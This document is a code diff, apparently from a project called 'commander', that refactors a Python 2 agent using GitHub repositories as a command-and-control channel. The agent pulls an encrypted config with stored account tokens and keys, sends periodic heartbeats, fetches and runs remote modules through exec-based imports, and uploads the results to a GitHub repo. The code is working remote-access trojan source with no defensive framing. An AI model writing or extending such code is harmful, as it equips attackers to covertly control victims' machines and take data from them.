@@ -13,6 +13,7 @@ from commander.thirdparty.Crypto import Random
 from commander.thirdparty.Crypto.PublicKey import RSA
 from commander.thirdparty.Crypto.Cipher import AES, PKCS1_OAEP
 from commander.thirdparty.httpimp import add_remote_repo, remove_remote_repo
+from commander.thirdparty.httpimp import remote_repo, git_repo
 
 try:
     from urllib2 import urlopen, Request
@@ -26,13 +27,14 @@ logging.basicConfig(level=logging.INFO, format=fmt)
 
 class GitHubAPI(object):
 
-    def __init__(self, gtoken=None, guser=None, gpwd=None,
+    def __init__(self, guser=None, gpwd=None, gtoken=None,
                  grepo=None, gbranch='master'):
         if not gtoken and not gpwd:
             raise('Token or password must have one')
-        self.token = gtoken
+
         self.owner = guser
         self.gpwd = gpwd
+        self.token = gtoken
         self.repo = grepo
         self.branch = gbranch
 
@@ -77,14 +79,14 @@ class GitHubAPI(object):
         uri = '/repos/%s/%s/contents/%s' % (self.owner, self.repo, path)
         data = {'message': msg, 'content': content.encode('base64')}
         logging.info('[*] Save result to %s' % path)
-        return self.request(self.token, 'PUT', uri, data)
+        return self.request('PUT', uri, data)
 
     def get(self, path):
         """
         GET /repos/:owner/:repo/contents/:path
         """
         uri = '/repos/%s/%s/contents/%s' % (self.owner, self.repo, path)
-        rsp = self.request(self.token, uri=uri)
+        rsp = self.request(uri=uri)
         content = json.loads(rsp.read().strip()) if rsp else {}
         # return content.get('content', '').decode('base64'), content
         return content
@@ -97,7 +99,7 @@ class GitHubAPI(object):
         data = {'message': msg,
                 'content': content.encode('base64'),
                 'sha': sha}
-        return self.request(self.token, 'PUT', uri, data)
+        return self.request('PUT', uri, data)
 
     def delete(self, path, sha, msg='delete file'):
         """
@@ -105,7 +107,7 @@ class GitHubAPI(object):
         """
         uri = '/repos/%s/%s/contents/%s' % (self.owner, self.repo, path)
         data = {'message': msg, 'sha': sha}
-        return self.request(self.token, 'DELETE', uri, data)
+        return self.request('DELETE', uri, data)
 
 
 def Threaded(func):
@@ -121,60 +123,77 @@ class Agent(object):
     # python -c "import os;print(os.urandom(8).hex())"
     uid = '602841a3ee0ecb12'
 
-    def __init__(self, conf_url):
-        self.debug = True
+    def __init__(self, owner, repo, branch='master',
+                 conf_path='config', debug=False):
+        self.owner = owner
+        self.repo = repo
+        self.branch = branch
+        self.conf_path = '/'.join((conf_path, self.uid + '.conf'))
+        self.debug = debug
         # self.idle = True
         self.silent = False
         # self.last_active = time.time()
         self.failed_connections = 0
+        self.conf = None
+        self.gh_conf = None
+        self.gh_result = None
         self.cmdpub = ''    # encode with hex
         self.prikey = ''
         self.aes_key = ''
         self.tasks = set()
         self.modules = {}
+        self.run_modules = []
         self.info = self.get_info()
-        self.init(conf_url)
+        self.init()
 
-    def init(self, conf_url):
+    def init(self):
         self.conf_sha = None
-        self.conf = self.get_conf_try(conf_url)
+        self.conf = self.get_conf_try(self.conf_url)
+        if not self.conf:
+            return
         self.parse_conf()
-        self.gh = GitHubAPI(self.token, self.owner, None, self.repo)
+        self.gh = GitHubAPI(self.gh_result[0], None,
+                            self.gh_result[1], self.gh_result[2])
         self.heartbeat()
 
     def parse_conf(self):
-        if not self.conf and self.debug:
-            raise('[!] Config is empty')
-
-        o, t, r = self.conf['BaseAcc'].split('$$')
-        self.owner = o
-        self.token = t
-        self.repo = r
+        self.gh_conf = self.conf['BaseAcc'].split('$$')
+        self.gh_result = self.conf['RetAcc'].split('$$')
         self.report_path = self.conf['RetPath']
         self.hbt = self.conf['HBTime']
-        self.conf_path = self.conf['ConfPath'] + self.uid + '.conf'
+        self.conf_path = '/'.join((self.conf['ConfPath'], self.uid + '.conf'))
+        self.aes_key = self.conf['AesKey']
+        self.cmdpub = self.conf['SrvPubKey']
+        self.prikey = self.conf['ToyPriKey']
+        self.modules = self.conf['Modules']
+
+        self.owner = self.gh_conf[0]
+        self.token = self.gh_conf[1]
+        self.repo = self.gh_conf[2]
+
+        self.conf = None
         # self.tasks.extend(self.conf['Tasks'])
-        for task in self.conf['Tasks']:
-            self.tasks.add(task)
+        # for task in self.conf['Tasks']:
+        #     self.tasks.add(task)
 
     @property
     def conf_url(self):
-        conf_url = 'https://raw.githubusercontent.com'
-        conf_url += '/%s/%s/%s/%s' % (self.owner, self.repo,
-                                      self.branch, self.conf_path)
+        conf_url = 'https://raw.githubusercontent.com/'
+        conf_url += '/'.join((self.owner, self.repo, self.branch,
+                              self.conf_path))
         return conf_url
 
-    def task_conf_url(self, taskid):
-        path = self.conf['ConfPath'] + 'task/'
-        path += taskid + '.conf'
-        url = 'https://raw.githubusercontent.com'
-        url += '/%s/%s/%s/%s' % (self.owner, self.repo,
-                                 self.branch, path)
-        return url
+    # def task_conf_url(self, taskid):
+    #     path = self.conf['ConfPath'] + 'task/'
+    #     path += taskid + '.conf'
+    #     url = 'https://raw.githubusercontent.com'
+    #     url += '/%s/%s/%s/%s' % (self.owner, self.repo,
+    #                              self.branch, path)
+    #     return url
 
     @Threaded
     def heartbeat(self):
-        path = self.conf['RetPath'] + 'knock/' + self.uid + '.hbt'
+        path = '/'.join((self.conf['RetPath'], 'knock', self.uid + '.hbt'))
         while True:
             # info = self.get_info()
             self.info['timestamp'] = time.time()
@@ -207,32 +226,38 @@ class Agent(object):
 
     def get_conf_try(self, url, trynum=3):
         num = 0
+        conf = None
         while num < trynum:
-            conf = self.get(url)
+            conf = self.get_content(url)
             if conf:
                 break
             num += 1
         return conf
 
-    def get_task(self, taskid):
-        conf = self.get(self.task_conf_url(taskid))
-        if not conf:
-            return
-        # Todo...
+    # def get_task(self, taskid):
+    #     conf = self.get_content(self.task_conf_url(taskid))
+    #     if not conf:
+    #         return
+    #     # Todo...
 
-    def parse_task_conf(self, conf):
-        pass
+    # def parse_task_conf(self, conf):
+    #     pass
 
     def is_conf_update(self):
         # check github file sha
-        c = self.gh.get(self.conf_path)
-        if c['sha'] == self.conf_sha:
+        try:
+            c = self.gh.get(self.conf_path)
+            if c['sha'] == self.conf_sha:
+                return False
+        except Exception as e:
+            if self.debug:
+                print(e)
             return False
         self.conf_sha = c['sha']
         self.conf = self.decrypt(c['content'].decode('base64'))
         return True
 
-    def get(self, url):
+    def get_content(self, url):
         try:
             conf = urlopen(url).read()
             if conf:
@@ -256,7 +281,7 @@ class Agent(object):
             print(s)
 
     @Threaded
-    def task_run(self):
+    def task_run(self, max=5):
         pass
 
     def random_key(self, num=16):
@@ -326,14 +351,33 @@ class Agent(object):
         return msg.encode('utf-8')
 
     @staticmethod
-    def load(module, url):
-        try:
-            logging.info('Try to import module')
-            add_remote_repo([module], url)
-            exec "import %s" % module
-        except Exception:
-            logging.error('Exception with import %s' % module)
-            pass
+    def load(repo, url, package='', module=None):
+        if not package and not module:
+            try:
+                logging.info('Try to import module')
+                add_remote_repo([repo], url)
+                exec "import %s" % repo
+            except Exception:
+                logging.error('Exception with import %s' % repo)
+                pass
+        else:
+            pk = '.'.join((repo, package)) if package.split(
+                '.')[0] != repo else package
+            md = ','.join(module) if isinstance(
+                module, (list, tuple)) else module
+            with remote_repo([repo], url):
+                exec "from %s import %s" % (pk, md)
+
+    def loadGH(self, module, package='', user=None, repo=None):
+        user = user or self.owner
+        repo = repo or self.repo
+        pk = '.'.join((repo, package)) if package.split(
+            '.')[0] != repo else package
+        md = ','.join(module) if isinstance(
+            module, (list, tuple)) else module
+
+        with git_repo(user, repo):
+            exec "from %s import %s" % (pk, md)
 
     @staticmethod
     def unload(module, url):
@@ -367,13 +411,13 @@ class Agent(object):
     #     tasks = self.load_task(self.task_url) if self.task_url else []
     #     self.run_modules += tasks
 
-    @staticmethod
-    def load_module(mod, pkg='toy.modules'):
-        try:
-            logging.info('Import %s from %s' % (mod, pkg))
-            exec "from %s import %s" % (pkg, mod)
-        except Exception:
-            logging.error("Import %s error" % '.'.join((pkg, mod)))
+    # def load_module(self, mod, pkg='toy.modules'):
+    #     try:
+    #         logging.info('Import %s from %s' % (mod, pkg))
+    #         self.load(self.repo, )
+    #         exec "from %s import %s" % (pkg, mod)
+    #     except Exception:
+    #         logging.error("Import %s error" % '.'.join((pkg, mod)))
 
     # def load_task(self, task_url):
     #     tasks = self.get(task_url)
@@ -401,9 +445,9 @@ class Agent(object):
         result = sys.modules[m].run() or 'Err'
         self.task_queue.get()
         if result:
-            logger.info('[*] Get result: %s' % result)
-            time.sleep(5)
-            gh.put(self.guser, self.gtoken, self.grepo, path, result)
+            print('[*] Get result: %s' % result)
+            # time.sleep(5)
+            self.report(result, path)
         if not loop:
             del sys.modules[m]
         return
